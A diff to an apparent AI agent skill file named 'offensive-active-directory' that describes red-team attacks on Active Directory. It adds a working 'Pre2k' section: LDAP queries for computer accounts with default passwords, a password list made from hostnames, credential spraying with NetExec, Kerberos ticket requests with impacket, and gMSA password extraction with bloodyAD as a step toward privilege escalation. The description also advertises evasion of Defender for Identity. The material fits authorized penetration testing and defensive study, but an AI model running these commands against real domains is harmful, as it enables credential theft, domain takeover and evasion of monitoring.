@@ -1,6 +1,6 @@
 ---
 name: offensive-active-directory
-description: "Active Directory attack methodology for internal network red team engagements. Covers reconnaissance (BloodHound, PowerView, ADExplorer), credential abuse (Kerberoasting, ASREProasting, NTLM relay, LLMNR/NBT-NS poisoning), privilege escalation (ACL abuse, GPO abuse, unconstrained/constrained delegation), lateral movement (Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, WMI/WinRM/PsExec), persistence (Golden/Silver/Diamond Tickets, DCSync, DCShadow, AdminSDHolder, Skeleton Key), forest trust attacks, ADCS abuse (ESC1-ESC15), and modern MDI/Defender for Identity evasion. Use when assessing on-prem AD, hybrid AD/Entra ID environments, or ADCS deployments."
+description: "Active Directory attack methodology for internal network red team engagements. Covers reconnaissance (BloodHound, PowerView, ADExplorer), credential abuse (Kerberoasting, ASREProasting, Pre-Windows 2000 computer accounts, NTLM relay, LLMNR/NBT-NS poisoning), privilege escalation (ACL abuse, GPO abuse, unconstrained/constrained delegation), lateral movement (Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, WMI/WinRM/PsExec), persistence (Golden/Silver/Diamond Tickets, DCSync, DCShadow, AdminSDHolder, Skeleton Key), forest trust attacks, ADCS abuse (ESC1-ESC15), and modern MDI/Defender for Identity evasion. Use when assessing on-prem AD, hybrid AD/Entra ID environments, or ADCS deployments."
 ---
 
 # Active Directory — Offensive Testing Methodology
@@ -103,6 +103,47 @@ hashcat -m 13100 tgs.txt rockyou.txt -r OneRuleToRuleThemAll.rule
 # Find users with DONT_REQUIRE_PREAUTH set
 impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass
 hashcat -m 18200 asrep.txt rockyou.txt
+```
+
+### Pre-Windows 2000 Compatible Access (Pre2k)
+
+```bash
+# 1. Identify pre2k candidates via LDAP (authenticated or anonymous if allowed)
+ldapsearch -x -H ldap://dc.corp.local -D 'user@corp.local' -w 'password' \
+  -b 'DC=corp,DC=local' \
+  '(&(userAccountControl=4128)(logonCount=0))' sAMAccountName | grep sAMAccountName
+
+# Alternatively: check "Pre-Windows 2000 Compatible Access" group members
+ldapsearch -x -H ldap://dc.corp.local -D 'user@corp.local' -w 'password' \
+  -b 'CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=corp,DC=local' member
+
+# 2. Generate password wordlist (lowercase sAMAccountName without $)
+cat computers.txt | tr '[:upper:]' '[:lower:]' | sed 's/\$$//' > passwords.txt
+
+# 3. Test with NetExec (line-by-line, no-bruteforce mode)
+nxc smb dc.corp.local -u computers.txt -p passwords.txt --no-bruteforce -k
+
+# 4. Request TGT for valid credential (sync time first — Kerberos <5min skew)
+sudo ntpdate dc-ip
+impacket-getTGT 'corp.local/COMPUTERNAME$:lowercasehostname' -dc-ip dc-ip
+export KRB5CCNAME=COMPUTERNAME\$.ccache
+klist  # verify ticket
+```
+
+Once you have a privileged computer account TGT, enumerate what it can access:
+
+```bash
+# Check group memberships (common: Domain Computers grants ReadGMSAPassword on gMSAs)
+ldapsearch -Q -Y GSSAPI -H ldap://dc.corp.local \
+  -b 'DC=corp,DC=local' "(sAMAccountName=COMPUTERNAME$)" memberOf
+
+# Extract gMSA password if ReadGMSAPassword ACE exists
+KRB5CCNAME=COMPUTERNAME$.ccache \
+  bloodyAD --host dc.corp.local --dc-ip dc-ip -d corp.local -u 'COMPUTERNAME$' -k \
+  get object 'gMSA_account$' --attr msDS-ManagedPassword
+
+# Typical escalation: gMSA → WinRM/SMB as service account → further ACL abuse
+impacket-getTGT corp.local/gMSA_account$ -hashes :ntlm_hash -dc-ip dc-ip
 ```
 
 ### LSASS / SAM Dumping
